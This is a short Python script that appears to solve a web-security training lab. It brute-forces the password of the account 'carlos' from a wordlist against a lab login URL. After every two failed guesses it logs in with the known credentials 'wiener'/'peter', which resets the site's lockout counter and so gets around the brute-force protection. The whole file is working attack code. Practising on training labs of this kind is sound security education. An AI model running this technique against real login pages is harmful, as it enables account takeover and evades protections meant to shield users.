with open('wordlist.txt', 'r') as f:
    passwords = f.read().split('\n')
    
import requests

url = 'https://0a91003203d07cd185565d84006d006b.web-security-academy.net/login'

count = 0
content = requests.post(url, data={'username': 'wiener', 'password': 'peter'})

for password in passwords:
    response = requests.post(url, data={'username':'carlos', 'password':password})
    print(f'[*] Trying password {password}')
    if "Your username is:" in response.text:
        print(f'[+] Password found: {password}')
        break
    else:
        count += 1
        if count == 2:
            count = 0
            requests.post(url, data={'username':'wiener', 'password':'peter'})
        print(f'[-] Attempt {password} failed')